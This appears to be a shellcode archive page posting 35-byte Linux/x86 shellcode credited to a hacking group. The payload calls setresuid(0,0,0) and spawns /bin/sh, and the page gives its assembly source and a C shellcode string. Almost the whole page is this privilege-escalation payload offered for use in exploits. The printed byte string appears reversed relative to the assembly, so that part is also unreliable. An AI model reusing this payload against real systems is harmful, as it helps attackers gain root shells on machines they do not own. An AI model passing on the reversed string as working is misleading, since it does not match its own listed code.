<html><head><title>Linux/x86 - setresuid(0,0,0)-/bin/sh - 35 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
{==========================================================}
{ linux x86 setresuid(0,0,0)-/bin/sh shellcode 35 bytes    }
{==========================================================}

Shellcode by the FHM crew:
----------------------------
http://fhm.noblogs.org
----------------------------

Contact us at:

--------------------------------------------------
sorrow: rawhazard@autistici.org; betat@hotmail.it
--------------------------------------------------
fhm: fhm@autistici.org;
--------------------------------------------------


Assembly code:

--[code]--
BITS 32

;setresuid(0,0,0)
xor eax, eax
xor ebx, ebx
xor ecx, ecx
cdq
mov BYTE al, 0xa4
int 0x80

;execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, NULL], [NULL])
push BYTE 11
pop eax
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push ecx
mov edx, esp
push ebx
mov ecx, esp
int 0x80
--[/code]--

Shellcode string:
--[code]--
char shellcode [] =
&quot;\x80\xcd\xe1\x89\x53\xe2\x89\x51\xe3\x89\x6e\x69\x62\x2f\x68\x68\x73\x2f\x2f
                    
\x68\x51\x58\x0b\x6a\x80\xcd\xa4\xb0\x99\xc9\x31\xdb\x31\xc0\x31&quot;
-[/code]-


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
